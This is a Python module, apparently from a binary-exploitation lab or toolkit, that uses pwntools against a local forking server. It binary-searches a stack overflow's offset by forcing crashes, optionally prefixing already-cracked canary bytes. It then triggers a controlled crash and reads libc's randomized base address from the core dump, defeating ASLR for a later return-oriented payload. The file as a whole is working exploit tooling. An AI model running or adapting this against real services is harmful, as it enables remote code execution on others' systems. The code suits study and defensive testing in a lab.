import glob
import time
from dataclasses import dataclass
from pathlib import Path

from pwn import p64, remote
from pwnlib.elf.corefile import Corefile

from .server import ForkingServer

_HEADER_MATCH_LEN = 64
_SEARCH_MAX = 512
_CORE_WAIT_TIMEOUT = 5.0
_CORE_CHECK_TIMEOUT = 1.0  # binary search only needs to know crash-vs-not
_CORE_POLL_INTERVAL = 0.1
_TARGET_ARCH = "amd64"  # this project only ever targets 64-bit Linux x86-64
# Canonical (top bytes zero) AND well below Linux's default mmap_min_addr,
# so this is guaranteed unmapped — a clean, reproducible page fault. See
# offset/finder.py's _crash_and_find_offset() docstring for why a raw
# filler/cyclic pattern's RIP can't be trusted on real hardware.
_MARKER = 0x1337


class LeakError(Exception):
    pass


@dataclass(frozen=True)
class LeakResult:
    offset: int
    libc_base: int


def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> LeakResult:
    """Recovers both the overflow offset and libc's real runtime base from
    `server`, against a genuinely ASLR'd target — reused by a *separate*,
    later connection to the same still-running server, valid because
    fork() never re-randomizes a child's memory layout, not because ASLR
    was disabled anywhere.

    The offset is found by binary-searching crash-vs-no-crash (mirroring
    canary/cracker.py's own offset search), not by reading what address a
    crash's RIP holds — see offset/finder.py's _crash_and_find_offset()
    docstring for why the latter only works under QEMU, not on real
    hardware. Once the offset is known, one final, fully-controlled crash
    (filler up to the offset + a safe canonical marker) recovers libc's
    base from the resulting corefile's own memory mappings — unaffected
    by the same issue, since it never needs to interpret RIP.

    `prefix` is sent before the search/leak payloads, unchanged — for a
    canary-protected target (Phase 6's canary/ module), passing the
    already-cracked canary bytes as `prefix` clears the canary check
    first, so the payload reaches the return address instead of tripping
    __stack_chk_fail. `offset` is still relative to the start of the
    post-prefix part, matching how build_canary_execve_chain() composes
    the final payload as `prefix + b"A" * offset + chain.payload()`.
    """
    offset = _find_offset_by_binary_search(server, prefix)
    libc_base = _leak_libc_base(server, libc_path, prefix, offset)
    return LeakResult(offset=offset, libc_base=libc_base)


def _find_offset_by_binary_search(server: ForkingServer, prefix: bytes) -> int:
    if not _check_crashes(server, prefix, _SEARCH_MAX):
        raise LeakError(f"target did not crash within {_SEARCH_MAX} bytes")
    lo, hi = 0, _SEARCH_MAX
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if _check_crashes(server, prefix, mid):
            hi = mid
        else:
            lo = mid
    return lo


def _check_crashes(server: ForkingServer, prefix: bytes, n: int) -> bool:
    io = remote("127.0.0.1", server.port)
    io.send(prefix + b"A" * n)
    io.recvall(timeout=1.0)
    io.close()
    try:
        core = _wait_for_crash_core(server, timeout=_CORE_CHECK_TIMEOUT)
    except LeakError:
        return False
    core.file.close()
    return True


def _leak_libc_base(server: ForkingServer, libc_path: str | Path, prefix: bytes, offset: int) -> int:
    io = remote("127.0.0.1", server.port)
    io.send(prefix + b"A" * offset + p64(_MARKER))
    io.recvall(timeout=2.0)
    io.close()

    core = _wait_for_crash_core(server)
    try:
        libc_header = Path(libc_path).read_bytes()[:_HEADER_MATCH_LEN]
        for mapping in core.mappings:
            if mapping.data[:_HEADER_MATCH_LEN] == libc_header:
                return mapping.start
        raise LeakError(f"could not locate {libc_path}'s runtime base in the crash corefile")
    finally:
        core.file.close()


def _wait_for_crash_core(server: ForkingServer, timeout: float = _CORE_WAIT_TIMEOUT) -> Corefile:
    """Locates the target's own crash corefile, whether this process is
    running under QEMU user-mode emulation or natively.

    Under QEMU (e.g. this project's devcontainer), a guest crash produces
    *two* core files: `qemu_<basename>_*.core`, written by QEMU itself with
    the guest's real x86-64 state, and a plain `core` file, which is the
    *qemu-x86_64 interpreter's own* host-architecture (e.g. aarch64) dump —
    irrelevant here. Running natively (e.g. a native x86-64 CI runner),
    there's no QEMU involved at all: the target crashes directly and the
    OS writes a single, directly-usable `core` file, and no `qemu_*` file
    ever appears.

    Rather than assume one environment or the other, every candidate that
    shows up gets parsed and checked by its own ELF architecture — the
    interpreter's host-arch dump gets discarded regardless of which glob
    it matched, so this works unmodified in either environment. Each
    ForkingServer has its own temp cwd, so there's no risk of an unrelated
    run's corefile matching.
    """
    basename = Path(server.binary_path).name
    qemu_pattern = str(server.cwd / f"qemu_{basename}_*.core")
    plain_core_path = server.cwd / "core"
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        candidates = sorted(glob.glob(qemu_pattern))
        if plain_core_path.exists():
            candidates.append(str(plain_core_path))
        for candidate in candidates:
            core_path = Path(candidate)
            try:
                core = Corefile(str(core_path))
            except Exception:
                # most likely caught mid-write (the file exists but isn't
                # fully flushed yet) — leave it for the next poll rather
                # than deleting a corefile that hasn't finished landing.
                continue
            if core.arch != _TARGET_ARCH:
                core.file.close()
                core_path.unlink(missing_ok=True)
                continue
            core_path.unlink(missing_ok=True)
            for stray in glob.glob(qemu_pattern):
                Path(stray).unlink(missing_ok=True)
            plain_core_path.unlink(missing_ok=True)
            return core
        time.sleep(_CORE_POLL_INTERVAL)
    raise LeakError(f"target crashed but no core dump appeared within {timeout}s")
